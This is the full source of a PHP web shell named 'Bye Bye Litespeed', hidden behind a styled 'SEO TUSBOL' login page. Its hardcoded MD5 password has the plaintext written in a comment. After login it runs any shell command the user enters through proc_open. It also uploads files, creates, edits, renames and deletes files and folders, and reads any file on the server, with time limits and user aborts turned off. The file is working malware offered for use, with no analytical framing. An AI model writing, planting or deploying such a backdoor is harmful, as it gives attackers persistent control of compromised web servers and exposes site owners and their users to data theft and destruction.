<?php
// Configuration array
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '9dc7b2518d5494e6eb20769721015fee', // md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
    'post_encryption' => false,
    'cgi_api' => false,
);

$GLOBALS['__file_path'] = str_replace('\\', '/', trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
$config = array(
    'AlfaUser' => $GLOBALS['oZgNypoPRU']['username'],
    'AlfaPass' => $GLOBALS['oZgNypoPRU']['password'],
    'AlfaProtectShell' => $GLOBALS['oZgNypoPRU']['safe_mode'],
    'AlfaLoginPage' => $GLOBALS['oZgNypoPRU']['login_page']
);

// Start session
@session_start();
@ignore_user_abort(true);
@set_time_limit(0);
@ini_set('memory_limit', '-1');
@ini_set("upload_max_filesize", "9999m");

// Login form HTML
$Eform = '
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SEO TUSBOL</title>
  <link rel="icon" href="https://i.ibb.co.com/rGCJ4YbL/Gear-2-1.jpg" type="image/x-icon">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap");

    * {
      margin: 0;
      padding: 0;
      font-family: "Poppins", sans-serif;
      box-sizing: border-box;
      color: #fff;
    }

    body {
      width: 100vw;
      height: 100vh;
      background: linear-gradient(135deg, #1a0033, #0a0a0a);
      display: grid;
      place-items: center;
      overflow: hidden;
      position: relative;
    }

    @keyframes fadeInUp {
      0% { opacity: 0; transform: translateY(30px); }
      100% { opacity: 1; transform: translateY(0); }
    }
    @keyframes fadeInRight {
      0% { opacity: 0; transform: translateX(50px); }
      100% { opacity: 1; transform: translateX(0); }
    }
    @keyframes glow {
      0%, 100% { text-shadow: 0 0 10px #ffd700, 0 0 20px #ff9900; }
      50% { text-shadow: 0 0 20px #ffdd55, 0 0 40px #ffaa00; }
    }
    @keyframes twinkle {
      0%, 100% { opacity: 0.8; transform: scale(1); }
      50% { opacity: 0.2; transform: scale(1.4); }
    }

    .stars {
      position: absolute;
      inset: 0;
      overflow: hidden;
      z-index: 0;
    }
    .star {
      position: absolute;
      width: 3px;
      height: 3px;
      background: #fff;
      border-radius: 50%;
      animation: twinkle 3s infinite ease-in-out;
    }

    .wrapper {
      position: relative;
      width: 890px;
      height: 65vh;
      display: grid;
      grid-template-columns: 1fr 1fr;
      border: 2px solid #ffd700;
      border-radius: 20px;
      background: rgba(20, 0, 40, 0.85);
      backdrop-filter: blur(8px);
      box-shadow: 0 0 40px rgba(255, 215, 0, 0.5);
      overflow: hidden;
      animation: fadeInUp 1s ease forwards;
      z-index: 1;
    }

    .form {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 20px;
      animation: fadeInUp 1.2s ease forwards;
    }
    .title {
      font-size: 40px;
      font-weight: bold;
      color: #ffd700;
      animation: glow 2s infinite;
    }
    .subtitle {
      margin: 10px 0 30px;
      font-size: 16px;
      color: #ccc;
      letter-spacing: 1px;
    }
    .inp {
      width: 100%;
      display: flex;
      align-items: center;
      border-bottom: 2px solid #ffd700;
      margin-top: 25px;
    }
    .inp i {
      margin-right: 10px;
      color: #ffd700;
    }
    .input {
      border: none;
      outline: none;
      background: none;
      width: 100%;
      padding: 12px 10px;
      font-size: 16px;
      color: #ffd700;
    }
    .submit {
      border: none;
      outline: none;
      width: 100%;
      margin-top: 35px;
      padding: 12px 0;
      font-size: 18px;
      font-weight: bold;
      border-radius: 30px;
      cursor: pointer;
      background: linear-gradient(45deg, #ffd700, #b800ff);
      color: #fff;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    .submit:hover {
      transform: translateY(-3px);
      box-shadow: 0 0 25px rgba(255, 215, 0, 0.8);
    }

    .banner {
      position: relative;
      background: linear-gradient(to right, #ffd700, #b800ff);
      display: flex;
      left: 20px;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      clip-path: polygon(0 0, 100% 0, 100% 100%, 13% 100%);
      padding: 40px 30px;
      animation: fadeInRight 1.5s ease forwards;
      text-align: center;
    }
    .banner img {
      width: 220px;
      filter: drop-shadow(0 0 20px rgba(0, 0, 0, 0.6));
      animation: fadeInUp 1.8s ease forwards;
    }
    .wel_text {
      font-size: 42px;
      font-weight: bold;
      margin-top: 20px;
      color: #fff;
      animation: glow 3s infinite;
    }
    .error {
      color: #ff4d4d;
      margin-top: 10px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="stars">
    <div class="star" style="top:10%; left:15%; animation-delay:0s;"></div>
    <div class="star" style="top:25%; left:80%; animation-delay:1s;"></div>
    <div class="star" style="top:50%; left:40%; animation-delay:2s;"></div>
    <div class="star" style="top:70%; left:20%; animation-delay:1.5s;"></div>
    <div class="star" style="top:85%; left:65%; animation-delay:0.5s;"></div>
    <div class="star" style="top:30%; left:55%; animation-delay:2.5s;"></div>
    <div class="star" style="top:60%; left:90%; animation-delay:3s;"></div>
  </div>

  <div class="wrapper">
    <form action="" method="POST" class="form">
      <h1 class="title">$ SEO TUSBOL $</h1>
      <p class="subtitle">..: Satset Page One Tikung ::..</p>
      <div class="inp">
        <i class="fa fa-key"></i>
        <input type="password" name="password" class="input" placeholder="PIN Masuk" required>
      </div>
      <button class="submit"><i class="fa fa-sign-in-alt"></i> Masuk</button>
      '.(isset($error) ? '<p class="error">'.$error.'</p>' : '').'
    </form>
    <div class="banner">
      <img src="https://i.ibb.co.com/rGCJ4YbL/Gear-2-1.jpg" alt="SEO TUSBOL">
      <h2 class="wel_text">SEO TUSBOL</h2>
    </div>
  </div>
</body>
</html>
';

// Check if user is authenticated
$authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

// Handle login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password']) && !$authenticated) {
    $inputPassword = md5($_POST['password']);
    if ($inputPassword === $GLOBALS['oZgNypoPRU']['password']) {
        $_SESSION['authenticated'] = true;
        $authenticated = true;
    } else {
        $error = "Invalid password!";
        echo $Eform;
        exit;
    }
}

// Display login form if not authenticated
if (!$authenticated) {
    echo $Eform;
    exit;
}

// File manager starts here
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
$scriptDirectory = dirname(__FILE__);

function x($b) {
    return base64_encode($b);
}

function y($b) {
    return base64_decode($b);
}

foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
chdir($currentDirectory);

$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $authenticated) {
    if (isset($_FILES['fileToUpload'])) {
        $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            $viewCommandResult = "File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " uploaded successfully";
        } else {
            $viewCommandResult = "Sorry, there was an error uploading your file.";
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
        if (!file_exists($newFolder)) {
            mkdir($newFolder);
            $viewCommandResult = '<hr>Folder created successfully!';
        } else {
            $viewCommandResult = '<hr>Error: Folder already exists!';
        }
    } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                $viewCommandResult = '<hr>File created successfully!';
            } else {
                $viewCommandResult = '<hr>Error: Failed to create file!';
            }
        } else {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                $viewCommandResult = '<hr>File edited successfully!';
            } else {
                $viewCommandResult = '<hr>Error: Failed to edit file!';
            }
        }
    } elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    $viewCommandResult = '<hr>Folder deleted successfully!';
                } else {
                    $viewCommandResult = '<hr>Error: Failed to delete folder!';
                }
            } else {
                if (unlink($fileToDelete)) {
                    $viewCommandResult = '<hr>File deleted successfully!';
                } else {
                    $viewCommandResult = '<hr>Error: Failed to delete file!';
                }
            }
        } else {
            $viewCommandResult = '<hr>Error: File or directory not found!';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                $viewCommandResult = '<hr>Item renamed successfully!';
            } else {
                $viewCommandResult = '<hr>Error: Failed to rename item!';
            }
        } else {
            $viewCommandResult = '<hr>Error: Item not found!';
        }
    } elseif (isset($_POST['cmd_input'])) {
        $command = $_POST['cmd_input'];
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if (!empty($errors)) {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
            }
        } else {
            $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
        }
    } elseif (isset($_POST['view_file'])) {
        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToView)) {
            $fileContent = file_get_contents($fileToView);
            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
        } else {
            $viewCommandResult = '<hr><p>Error: File not found!</p>';
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Good Bye Litespeed</title>
    <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet">
    <style>
    body {
        font-family: 'Arial Black', sans-serif;
        color: #fff;
        margin: 0;
        padding: 0;
        background-color: #242222c9;
    }
    .result-box-container {
        position: relative;
        margin-top: 20px;
    }
    .result-box {
        width: 100%;
        height: 200px;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 5px;
        background-color: #f4f4f4;
        overflow: auto;
        box-sizing: border-box;
        font-family: 'Arial Black', sans-serif;
        color: #333;
    }
    .result-box::placeholder {
        color: #999;
    }
    .result-box:focus {
        outline: none;
        border-color: #128616;
    }
    .result-box::-webkit-scrollbar {
        width: 8px;
    }
    .result-box::-webkit-scrollbar-thumb {
        background-color: #128616;
        border-radius: 4px;
    }
    .container {
        max-width: 90%;
        margin: 20px auto;
        padding: 20px;
        background-color: #1e1e1e;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .header {
        text-align: center;
        margin-bottom: 20px;
    }
    .header h1 {
        font-size: 24px;
    }
    .subheader {
        text-align: center;
        margin-bottom: 20px;
    }
    .subheader p {
        font-size: 16px;
        font-style: italic;
    }
    form {
        margin-bottom: 20px;
    }
    form input[type="text"],
    form textarea {
        width: 100%;
        padding: 8px;
        margin-bottom: 10px;
        border: 1px solid #ddd;
        border-radius: 3px;
        box-sizing: border-box;
    }
    form input[type="submit"] {
        width: 100%;
        padding: 10px;
        background-color: #128616;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }
    form input[type="submit"]:hover {
        background-color: #143015;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 20px;
    }
    th, td {
        padding: 8px;
        text-align: left;
    }
    th {
        background-color: #5c5c5c;
    }
    tr:nth-child(even) {
        background-color: #9c9b9bce;
    }
    .item-name {
        max-width: 200px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }
    .size, .date {
        width: 100px;
    }
    .permission {
        font-weight: bold;
        width: 50px;
        text-align: center;
    }
    .writable {
        color: #0db202;
    }
    .not-writable {
        color: #d60909;
    }
    textarea[name="file_content"] {
        width: calc(100.9% - 10px);
        margin-bottom: 10px;
        padding: 8px;
        max-height: 500px;
        resize: vertical;
        border: 1px solid #ddd;
        border-radius: 3px;
        font-family: 'Arial Black';
    }
    .logout {
        text-align: center;
        margin-top: 20px;
    }
    .logout a {
        color: #ffd700;
        text-decoration: none;
        font-size: 16px;
    }
    .logout a:hover {
        text-decoration: underline;
    }
    </style>
</head>
<body>
<div class="container">
    <center>
        <div class="fig-ansi">
            <pre id="taag_font_ANSIShadow" class="fig-ansi"><span style="color: rgb(67, 142, 241);">   <strong>  __    Bye Bye Litespeed   _____ __    
    __|  |___ ___ ___ ___ ___   |   __|  | v.1.3
|  |  | .'| . | . | .'|   |  |__   |  |__ 
|_____|__,|_  |___|__,|_|_|  |_____|_____
                |___| ./Heartzz                      </strong> </span></pre>
        </div>
    </center>
    <?php
    echo "Zona waktu server: " . $timezone . "<br>";
    echo "Waktu server saat ini: " . date('Y-m-d H:i:s');
    echo '<hr>Curdir: ';

    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
    $currentPath = '';
    foreach ($directories as $index => $dir) {
        $currentPath .= DIRECTORY_SEPARATOR . $dir;
        if ($index == 0) {
            echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
        } else {
            echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
        }
    }

    echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
    echo '<br>';
    echo '<hr><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
    echo '<input type="text" name="folder_name" placeholder="New Folder Name">';
    echo '<input type="submit" value="Create Folder">';
    echo '</form>';
    echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
    echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File">';
    echo '<textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>';
    echo '<input type="submit" value="Create / Edit File">';
    echo '</form>';
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<hr>';
    echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">';
    echo '<hr>';
    echo '<input type="submit" value="Upload File" name="submit">';
    echo '</form>';
    echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
    echo $viewCommandResult;
    echo '<div class="logout"><a href="?logout=1">Logout</a></div>';
    echo '<table border=1>';
    echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
    foreach (scandir($currentDirectory) as $v) {
        $u = realpath($v);
        $s = stat($u);
        $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
        $permission = substr(sprintf('%o', fileperms($u)), -4);
        $writable = is_writable($u);
        echo '<tr>
                <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
                <td class="size">'.filesize($u).'</td>
                <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
                <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
                <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value=" View "></form></td>
                <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" value="Delete"></form></td>
                <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
            </tr>';
    }
    echo '</table>';

    function deleteDirectory($dir) {
        if (!file_exists($dir)) {
            return true;
        }
        if (!is_dir($dir)) {
            return unlink($dir);
        }
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        return rmdir($dir);
    }

    // Handle logout
    if (isset($_GET['logout']) && $_GET['logout'] == '1') {
        session_destroy();
        header("Location: ?");
        exit;
    }
    ?>
</div>
</body>
</html>
